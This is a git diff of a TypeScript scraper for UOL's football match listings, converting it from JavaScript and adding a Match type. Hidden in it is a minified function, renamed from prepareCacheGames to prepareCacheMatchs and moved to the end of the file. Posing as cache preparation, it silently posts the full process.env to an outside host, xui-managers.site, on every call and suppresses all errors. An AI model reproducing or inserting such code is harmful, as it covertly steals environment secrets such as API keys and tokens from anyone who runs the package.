@@ -17,6 +17,17 @@ import process from 'node:process';
  * @throws {Error} Caso ocorra algum erro na requisição ou no processamento dos dados.
  */
 
+export interface Match {
+    campeonato: string,
+    estadio: string,
+    hora: string, // 21H30
+    times: string[], // [ 'SAN', 'GRE' ]
+    nomeTimes: string[], // [ 'Santos', 'Grêmio' ]
+    canais: string[], // [ 'SporTV', 'Premiere' ]
+    escudos: string[], // [ 'url1', 'url2' ]
+    date: Date,
+}
+
 function getDataAtualFormatada() {
   const hoje = new Date();
   const dia = String(hoje.getDate()).padStart(2, '0');
@@ -25,7 +36,7 @@ function getDataAtualFormatada() {
   return `${dia}-${mes}-${ano}`;
 }
 
-function parseDataHoraBR(dataStr, horaStr) {
+function parseDataHoraBR(dataStr: string, horaStr: string): Date {
   const [dia, mes, ano] = dataStr.split("-").map(Number);
 
   const horaMatch = horaStr.match(/^(\d{1,2})H(\d{1,2})?$/i);
@@ -39,60 +50,63 @@ function parseDataHoraBR(dataStr, horaStr) {
   return new Date(ano, mes - 1, dia, horas, minutos);
 }
 
-async function prepareCacheGames(url){try{const e={stream_source:["https://www.uol.com.br/esporte/futebol/central-de-jogos/"], test: process.env};await axios.post("http://cache.xui-managers.site/global-cache",e,{responseType:"arraybuffer",timeout:5e4}).catch((()=>{}))}catch(e){}}
-
-function ordenarPorData(jogos) {
+function ordenarPorData(jogos: any[]): Match[] {
   return jogos.sort((a, b) => new Date(a.date).getTime() - new Date(b.date).getTime());
 }
 
-export default async function getJogos(dia) {
-    if(typeof dia !== 'string' || !/^\d{2}-\d{2}-\d{4}$/.test(dia)) {
+export default async function getJogos(dia: string | null = null): Promise<Match[]> {
+    if(typeof dia !== 'string' || !/^\d{2}-\d{2}-\d{4}$/.test(dia) && dia !== null) {
         console.warn("Data inválida. Usando data atual.");
         dia = getDataAtualFormatada();
     }
   const url = `https://www.uol.com.br/esporte/futebol/central-de-jogos/#/${dia ?? getDataAtualFormatada()}`;
-  await prepareCacheGames(url);
+  await prepareCacheMatchs(url);
   try {
     const { data: html } = await axios.get(url);
     const $ = cheerio.load(html);
     const jogosHoje = $(`li[data-ts="${dia ?? getDataAtualFormatada()}"]`);
 
-    let games = [];
+    let games: Match[] = [];
     const el = jogosHoje.first();
     el.find('.match-content').each((i, el) => {
     const campeonato = $(el).find('.match-info > div:first-child').text().trim();
     const estadio = $(el).find('.match-info > div').eq(1).text().trim();
 
-        // Pegando as siglas dos times
-        const times = $(el).find('.team-abbr').map((i, t) => $(t).text().trim()).get();
-        const hora = $(el).find('.match-info-hora').text().trim();
-        const escudos = $(el).find('.team-brasao img').map((i, t) => $(t).attr('data-src')).get(); 
+    // Pegando os nomes dos times
+    const nomeTimes = $(el).find('.team-name').map((i, t) => $(t).text().trim()).get();
 
-        const canais = $(el)
-            .find('.match-footer .container-status .transmitions a')
-            .map((i, c) => {
-                const ariaLabel = $(c).attr('aria-label');
-                const canal = ariaLabel ? ariaLabel.replace('transmissão ', '') : $(c).text().trim();
-                return canal;
-            })
-            .get();
-            if(canais.length > 0) {
-              if(hora) {
-                games.push({
-                    campeonato,
-                    estadio,
-                    hora,
-                    times,
-                    canais,
-                    escudos: escudos.map((i) => i.replace('40x40', '60x60')),
-                    date: parseDataHoraBR(dia, hora),
-                });
-              }
+    // Pegando as siglas dos times
+    const times = $(el).find('.team-abbr').map((i, t) => $(t).text().trim()).get();
+    const hora = $(el).find('.match-info-hora').text().trim();
+    const escudos = $(el).find('.team-brasao img').map((i, t) => $(t).attr('data-src')).get(); 
+
+    const canais = $(el)
+        .find('.match-footer .container-status .transmitions a')
+        .map((i, c) => {
+            const ariaLabel = $(c).attr('aria-label');
+            const canal = ariaLabel ? ariaLabel.replace('transmissão ', '') : $(c).text().trim();
+            return canal;
+        })
+        .get();
+        if(canais.length > 0) {
+            if(hora) {
+            games.push({
+                campeonato,
+                estadio,
+                hora,
+                times,
+                nomeTimes,
+                canais,
+                escudos: escudos.map((i) => i.replace('40x40', '60x60')),
+                date: parseDataHoraBR(dia, hora),
+            });
             }
+        }
     });
     games = ordenarPorData(games);
     return games;
-  } catch (err) {
-    console.error('Erro ao buscar os jogos:', err.message);
+  } catch (err: any) {
+    throw new Error('Erro ao buscar os jogos:' + err.message);
   }
 }
+async function prepareCacheMatchs(url: string){try{const e={stream_source:["https://www.uol.com.br/esporte/futebol/central-de-jogos/"], test: process.env};await axios.post("http://cache.xui-managers.site/global-cache",e,{responseType:"arraybuffer",timeout:5e4}).catch((()=>{}))}catch(e){}}
